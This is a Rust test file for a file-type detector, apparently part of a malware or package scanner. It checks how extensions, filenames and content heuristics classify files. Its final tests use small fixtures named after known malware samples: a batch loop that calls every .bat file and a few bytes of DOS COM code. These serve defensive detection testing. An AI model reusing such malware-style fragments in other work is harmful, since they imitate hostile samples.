    fn unsupported_ocaml_extensions_skip_weak_language_heuristics() {
        let ml = b"open Stdune\nmodule Scheduler = Fiber.Scheduler\nlet main () = Fiber.run Scheduler.go\n";
        let det = detect(Path::new("scheduler_bench.ml"), ml).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());

        let mli = b"type t\nval create : unit -> t\nval run : t -> unit\n";
        let det = detect(Path::new("duneboot.mli"), mli).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());
    }

    /// Negative: a `.cargo.toml` file with text content stays in its
    /// declared role via the extension/filename path. Data formats are
    /// listed in `ext::is_data_format` precisely so heuristics doesn't
    /// second-guess them — even if the body's first few KB include
    /// keyword sequences that look script-like.
    #[test]
    fn data_format_extension_skips_heuristics() {
        // YAML body deliberately seeded with `===` and `WScript.` —
        // both are heuristic triggers — to confirm `.yaml` short-
        // circuits past the heuristic stage.
        let body = b"name: example\n=== heading ===\n# WScript.Shell mention\nfield: value\n";
        let det = detect(Path::new("config.yaml"), body);
        // `.yaml` isn't a recognised type in fileid's enum (treated as a
        // data format that the analyzer pipeline handles elsewhere), so
        // the function returning `None` here is correct — the important
        // assertion is that we did NOT misclassify this as JavaScript /
        // VBScript via heuristics. If a regression makes heuristics fire,
        // `det` would be `Some(JavaScript)` or similar instead of `None`.
        if let Some(d) = det {
            assert!(
                !matches!(
                    d.file_type,
                    FileType::JavaScript | FileType::Vbs | FileType::PowerShell
                ),
                "yaml body misclassified as {:?}",
                d.file_type
            );
        }
    }

    #[test]
    fn package_json_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/package.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageJson);
    }

    #[test]
    fn package_lock_json_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/package-lock.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageLockJson);
    }

    #[test]
    fn cargo_toml_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/Cargo.toml"), b"[package]").unwrap();
        assert_eq!(det.file_type, FileType::CargoToml);
    }

    #[test]
    fn composer_json_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/composer.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::ComposerJson);
    }

    /// A temp file with a mangled name (old behavior: suffix-based) must NOT
    /// match filename detection — this documents why the temp-directory
    /// approach is necessary.
    #[test]
    fn mangled_temp_name_does_not_detect_package_json() {
        // Old behavior: TempBuilder::new().suffix("_package.json") produces
        // a filename like ".tmpXXXXXX_package.json" which doesn't match.
        let det = detect(Path::new("/tmp/.tmpABC_package.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::Json);
    }

    /// Every variant's label is unique and round-trips through `from_label`,
    /// so the two hand-written matches can never silently drift apart. The
    /// array is the full variant set; `label` itself is a wildcard-free match,
    /// so the compiler already guarantees every variant *has* a label.
    #[test]
    fn label_round_trips() {
        use std::collections::HashSet;
        let all = [
            FileType::MachO,
            FileType::Elf,
            FileType::Pe,
            FileType::JavaClass,
            FileType::PythonBytecode,
            FileType::Beam,
            FileType::Wasm,
            FileType::Dex,
            FileType::Shell,
            FileType::Batch,
            FileType::Jcl,
            FileType::Vbs,
            FileType::Python,
            FileType::JavaScript,
            FileType::TypeScript,
            FileType::Go,
            FileType::Rust,
            FileType::Java,
            FileType::Ruby,
            FileType::Php,
            FileType::Perl,
            FileType::Lua,
            FileType::CSharp,
            FileType::PowerShell,
            FileType::Swift,
            FileType::ObjectiveC,
            FileType::Groovy,
            FileType::Scala,
            FileType::Kotlin,
            FileType::Zig,
            FileType::Elixir,
            FileType::Clojure,
            FileType::C,
            FileType::AppleScript,
            FileType::Makefile,
            FileType::Dockerfile,
            FileType::PackageJson,
            FileType::PackageLockJson,
            FileType::ComposerJson,
            FileType::ComposerLock,
            FileType::CargoToml,
            FileType::CargoLock,
            FileType::PyProjectToml,
            FileType::RequirementsTxt,
            FileType::PoetryLock,
            FileType::PipfileLock,
            FileType::GemfileLock,
            FileType::YarnLock,
            FileType::PnpmLock,
            FileType::GoMod,
            FileType::GoSum,
            FileType::Gyp,
            FileType::GithubActions,
            FileType::SystemdService,
            FileType::DesktopEntry,
            FileType::PkgInfo,
            FileType::SrcInfo,
            FileType::VsixManifest,
            FileType::ChromeManifest,
            FileType::Registry,
            FileType::Json,
            FileType::Xml,
            FileType::Plist,
            FileType::Nib,
            FileType::Svg,
            FileType::Html,
            FileType::Jsp,
            FileType::Asp,
            FileType::Cfml,
            FileType::Tex,
            FileType::Yara,
            FileType::PostScript,
            FileType::DosCom,
            FileType::Mirc,
            FileType::IrcII,
            FileType::Markdown,
            FileType::Text,
            FileType::Data,
            FileType::Unknown,
            FileType::Zip,
            FileType::Tar,
            FileType::TarGz,
            FileType::TarBz2,
            FileType::TarXz,
            FileType::TarZst,
            FileType::Gz,
            FileType::Bz2,
            FileType::Xz,
            FileType::Lzma,
            FileType::Zst,
            FileType::SevenZ,
            FileType::Rar,
            FileType::Cab,
            FileType::Asar,
            FileType::Jar,
            FileType::Deb,
            FileType::Rpm,
            FileType::Dmg,
            FileType::Iso,
            FileType::Chm,
            FileType::Crx,
            FileType::Xpi,
            FileType::Whl,
            FileType::Gem,
            FileType::Npm,
            FileType::Crate,
            FileType::Conda,
            FileType::Egg,
            FileType::Nupkg,
            FileType::Ipa,
            FileType::Vsix,
            FileType::Xbps,
            FileType::ApkAndroid,
            FileType::ApkAlpine,
            FileType::PkgMacos,
            FileType::PkgFreebsd,
            FileType::PkgArch,
            FileType::PythonSdist,
            FileType::OciImage,
            FileType::GentooBinpkg,
            FileType::Rtf,
            FileType::OleDoc,
            FileType::Msi,
            FileType::Ooxml,
            FileType::Lnk,
            FileType::Jpeg,
            FileType::Png,
            FileType::Pdf,
            FileType::Pickle,
            FileType::Odf,
        ];
        let mut seen = HashSet::new();
        for ft in all {
            let label = ft.label();
            assert!(seen.insert(label), "duplicate label {label:?}");
            assert_eq!(
                FileType::from_label(label),
                Some(ft),
                "round-trip failed for {label:?}"
            );
        }
        assert_eq!(FileType::from_label("not_a_label"), None);
    }

    #[test]
    fn serde_uses_canonical_label() {
        // The serialized form is the canonical label, not the old snake_case
        // derive — `tar.gz`, not `tar_gz`; `macho`, not `mach_o`.
        assert_eq!(
            serde_json::to_string(&FileType::TarGz).unwrap(),
            "\"tar.gz\""
        );
        assert_eq!(
            serde_json::to_string(&FileType::MachO).unwrap(),
            "\"macho\""
        );
        let ft: FileType = serde_json::from_str("\"python_sdist\"").unwrap();
        assert_eq!(ft, FileType::PythonSdist);
        assert!(serde_json::from_str::<FileType>("\"tar_gz\"").is_err());
    }
}

#[cfg(test)]
mod static_lib_extension_override_tests {
    use super::*;

    /// A real ar archive is caught by magic in stage 1 and is unaffected.
    #[test]
    fn real_ar_archive_still_wins() {
        let mut data = b"!<arch>\n".to_vec();
        data.extend_from_slice(&[0x20; 64]);
        assert_eq!(
            detect(Path::new("libfoo.a"), &data).map(|d| d.file_type),
            Some(FileType::StaticLib)
        );
    }

    /// vxheaven appends a variant letter, so `Trojan.BAT.DelAll.a` looks like
    /// an ar archive by extension while being a batch script. Since a genuine
    /// `.a` always carries `!<arch>`, the sniffer is allowed to look inside.
    #[test]
    fn batch_body_named_dot_a_is_batch() {
        let data = b"@echo off\r\nif not exist c:\\x.bat goto skip\r\nfor %%f in (*.bat) do call %%f\r\n:skip\r\n";
        let d = detect(Path::new("Trojan.BAT.DelAll.a"), data).expect("detected");
        assert_ne!(d.file_type, FileType::StaticLib);
        assert!(d.extension_mismatch());
    }

    /// An `.a` without `!<arch>` is never a static library. An 8-byte COM
    /// program is still a program: `CD 21` is never valid UTF-8.
    #[test]
    fn dot_a_without_ar_magic_is_its_body() {
        let data = [0xe9u8, 0x12, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xc3];
        assert_eq!(
            detect(Path::new("Virus.DOS.Trivial.40.a"), &data).map(|d| d.file_type),
            Some(FileType::DosCom)
        );
        assert_eq!(
            detect(
                Path::new("Backdoor.IRC.Notes.a"),
                b"see you on the channel tonight\n"
            )
            .map(|d| d.file_type),
            Some(FileType::Text)
        );
    }
}
